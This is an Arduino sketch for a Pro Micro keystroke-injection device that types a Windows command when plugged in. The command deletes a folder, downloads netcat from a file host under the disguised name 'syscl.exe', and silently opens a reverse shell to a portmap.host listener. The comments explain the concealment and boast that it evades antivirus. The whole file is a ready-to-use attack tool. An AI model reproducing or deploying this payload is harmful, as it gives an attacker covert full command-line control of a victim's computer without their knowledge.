#include "Keyboard.h"

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  Keyboard.begin();
  delay(1500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(100);
  Keyboard.print("cmd /c cd / & rmdir /s /q win & mkdir win & cd win & curl https://file.io/abcdxyz -o syscl.exe & START /MIN syscl.exe [PORTMAP_ID].portmap.host port -e cmd.exe -d & exit");
  //Get access to command prompt and cd to root dir and remove the directory win.
  //If it already exists, then makedir win and cd to win and then fetch the netcat executable that's hosted online. 
  //You can use any hosting service or host on your own. Just replace the "https://file.io/abcdxyz" part to whatever u have.
  //Then it saves the executable as syscl.exe, which appears like a normal system process in the Task Manager of windows.
  //Then it starts syscl.exe netcat executable service silently without the user ever knowing that it has been started.
  //It looks for the host machine that's trying to connect to the victim PC. Here, portmap is used for pot forwarding but you can use any other method.
  //The listener will have command prompt access to the entire system. Handle with care!
  typeKey(KEY_RETURN);
  Keyboard.end();
}
void loop() {}

//pro micro reverse shell, not detected by antiviruses
